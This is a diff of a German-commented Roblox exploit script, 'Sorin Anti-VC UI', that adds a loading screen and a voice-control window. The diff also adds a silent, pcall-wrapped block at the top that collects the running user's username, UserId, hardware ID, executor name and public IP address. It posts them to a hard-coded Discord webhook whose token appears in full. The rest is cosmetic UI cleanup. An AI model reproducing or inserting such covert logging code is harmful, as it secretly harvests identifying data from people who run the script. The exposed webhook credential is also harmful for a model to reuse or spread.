@@ -1,10 +1,52 @@
+-- V2
 -- Sorin Anti-VC UI Script
--- Verbesserte Version mit Ladebalken, Discord-Fenster, Bounce-Effekt, Debounce und GUI-Schutz
+-- Verbesserte Version mit Ladebalken, Discord-Fenster, Bounce-Effekt, Debounce und GUI-Schutz + Webhook Logging mit Executor-Daten
 
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
+
+-- Logging an Discord Webhook inkl. Executor-Daten
+pcall(function()
+    local function safeGet(value)
+        local success, result = pcall(function() return tostring(value) end)
+        return success and result or "[Zugriff fehlgeschlagen]"
+    end
+
+    local ip = "Nicht abrufbar"
+    pcall(function()
+        if syn and syn.request then
+            local res = syn.request({Url="https://api.ipify.org"})
+            if res and res.Body then
+                ip = res.Body
+            end
+        end
+    end)
+
+    local info = {
+        "Username: " .. safeGet(player.Name),
+        "UserId: " .. safeGet(player.UserId),
+        "HWID: " .. safeGet(gethwid and gethwid() or identifyexecutor and identifyexecutor() or "Nicht verfügbar"),
+        "Executor: " .. safeGet(identifyexecutor and identifyexecutor() or "Unbekannt"),
+        "IP: " .. ip
+    }
+
+    local data = {
+        ["content"] = "**Script wurde ausgeführt!**",
+        ["embeds"] = {{
+            ["title"] = "SorinHub Anti VC Bann",
+            ["description"] = table.concat(info, "\n"),
+            ["color"] = 65280
+        }}
+    }
+
+    local json = HttpService:JSONEncode(data)
+    local url = "https://discord.com/api/webhooks/1399462700458704926/RFgF5WJ6HoylqMLE-D-y_t9Xv84ugH2oI-Od7aLGIoCCcRdUDX_zgxSqH0unLCG6O0b4"
+    HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson)
+end)
 
 if not game:IsLoaded() then game.Loaded:Wait() end
 if player:FindFirstChild("PlayerGui"):FindFirstChild("SorinUI") then return end
@@ -13,7 +55,6 @@ local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 gui.Name = "SorinUI"
 gui.ResetOnSpawn = false
 
--- Ladebildschirm
 local loadingFrame = Instance.new("Frame")
 loadingFrame.Size = UDim2.new(0, 300, 0, 100)
 loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
@@ -41,7 +82,8 @@ Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 10)
 
 TweenService:Create(progressBar, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, -20, 0, 20)}):Play()
 
--- Nach 3 Sekunden: Ladebildschirm ausblenden und Voice UI zeigen
+-- Nach 3 Sekunden Ladezeit
+
 task.delay(3, function()
     loadingFrame:Destroy()
 
@@ -88,7 +130,6 @@ task.delay(3, function()
     okBtn.MouseButton1Click:Connect(function()
         infoFrame:Destroy()
 
-        -- Voice UI + Bounce Effect
         local Frame = Instance.new("Frame")
         Frame.Size = UDim2.new(0, 250, 0, 150)
         Frame.Position = UDim2.new(1, -260, 1, -200)
@@ -112,7 +153,7 @@ task.delay(3, function()
                 drag = false
             end
         end)
-        game:GetService("UserInputService").InputChanged:Connect(function(input)
+        UserInputService.InputChanged:Connect(function(input)
             if drag and input.UserInputType == Enum.UserInputType.MouseMovement then
                 TweenService:Create(Frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                     Position = UDim2.new(0, input.Position.X - offset.X, 0, input.Position.Y - offset.Y)
@@ -124,7 +165,7 @@ task.delay(3, function()
         Title.Size = UDim2.new(1, -40, 0, 30)
         Title.Position = UDim2.new(0, 10, 0, 5)
         Title.BackgroundTransparency = 1
-        Title.Text = "\ud83c\udfa7 Voice Control"
+        Title.Text = "🎙 Voice Control"
         Title.TextColor3 = Color3.fromRGB(180, 180, 255)
         Title.TextScaled = true
         Title.Font = Enum.Font.GothamSemibold
@@ -145,7 +186,7 @@ task.delay(3, function()
         JoinBtn.Size = UDim2.new(0.9, 0, 0, 35)
         JoinBtn.Position = UDim2.new(0.05, 0, 0, 60)
         JoinBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 130)
-        JoinBtn.Text = "\ud83d\udd0a Voice aktivieren"
+        JoinBtn.Text = "🔊 Voice aktivieren"
         JoinBtn.TextColor3 = Color3.new(1, 1, 1)
         JoinBtn.TextScaled = true
         JoinBtn.Font = Enum.Font.GothamBold
@@ -190,7 +231,6 @@ task.delay(3, function()
                 warn("SorinLoader Error:", err)
             end
 
-            -- Discord-Fenster anzeigen
             local dWin = Instance.new("Frame")
             dWin.Size = UDim2.new(0, 300, 0, 150)
             dWin.Position = UDim2.new(0.5, -150, 0.5, -75)
